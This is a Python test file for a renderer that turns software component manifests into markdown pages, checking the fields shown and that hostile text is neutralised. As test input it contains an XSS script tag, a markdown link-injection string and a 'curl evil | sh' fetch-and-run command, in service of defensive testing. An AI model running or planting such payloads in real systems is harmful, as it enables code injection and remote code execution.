"""Component kinds render inertly; nothing publishes them yet."""

import copy
import subprocess
import sys
import unittest
from pathlib import Path

from tests.test_composable_components import FILES, PIN, component
from pack_details import render_component

ROOT = Path(__file__).resolve().parents[1]


def manifest(kind):
    body = component()
    if kind == "application_component":
        del body["dependencies"]
        body["entrypoints"] = [{"name": "serve", "argv": ["/bin/app", "--flag"]}]
    return {"kind": kind, kind: body, "files": copy.deepcopy(FILES)}


class ComponentPageTests(unittest.TestCase):
    def test_component_page_shows_kind_requirements_entrypoints_and_policy(self):
        for kind in ("application_component", "runtime_component", "tool_component"):
            text = "".join(render_component(manifest(kind)))
            for want in (f"`{kind}`", "`aarch64`", "`musl`", "`/lib/ld-musl-aarch64.so.1`", "`6.1.0`", "`pty`",
                         "`pack/group.toml`", "`6` bytes",
                         "requirements to compare against a selected signed base, not evidence"):
                self.assertIn(want, text)
            if kind == "application_component":
                self.assertIn("`/bin/app` `--flag`", text)
                self.assertNotIn("Dependencies", text)
            else:
                self.assertIn(f"1. `{PIN['reference']}` `{'b' * 64}`", text)
                self.assertNotIn("Entrypoints", text)

    def test_component_rendering_neutralises_hostile_text(self):
        evil = "x`](http://e)\n<script>alert(1)</script>" + "A" * 500
        app = manifest("application_component")
        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/app", evil]
        app["application_component"]["requirements"]["required_capabilities"] = [evil]
        tool = manifest("tool_component")
        tool["tool_component"]["dependencies"] = [{"reference": evil, "manifest_sha256": "b" * 64}]
        for m in (app, tool):
            text = "".join(render_component(m))
            self.assertNotIn("\n<script", text)
            self.assertNotIn("x`", text)
            self.assertNotIn("A" * 300, text)
            for line in text.splitlines():
                self.assertEqual(line.count("`") % 2, 0, line)

    def test_argv_elements_are_separate_spans_and_cuts_are_marked(self):
        app = manifest("application_component")
        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh -c x"]
        one = "".join(render_component(app))
        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh", "-c", "x"]
        three = "".join(render_component(app))
        self.assertIn("`/bin/sh -c x`", one)
        self.assertIn("`/bin/sh` `-c` `x`", three)
        app["application_component"]["entrypoints"][0]["argv"] = ["/bin/sh", "-c", "B" * 250 + "; curl evil | sh"]
        text = "".join(render_component(app))
        self.assertIn("(+", text)
        self.assertNotIn("curl", text)

    def test_x86_64_component_renders(self):
        m = manifest("application_component")
        m["application_component"]["guest_arch"] = "x86_64"
        self.assertIn("`x86_64`", "".join(render_component(m)))

    def test_published_pages_unchanged(self):
        done = subprocess.run([sys.executable, "scripts/build-pack-pages.py", "--check"], cwd=ROOT,
                              capture_output=True, text=True)
        self.assertEqual(done.returncode, 0, done.stdout + done.stderr)
        diff = subprocess.run(["git", "diff", "--stat", "--", "docs/registry"], cwd=ROOT,
                              capture_output=True, text=True)
        self.assertEqual(diff.stdout, "")
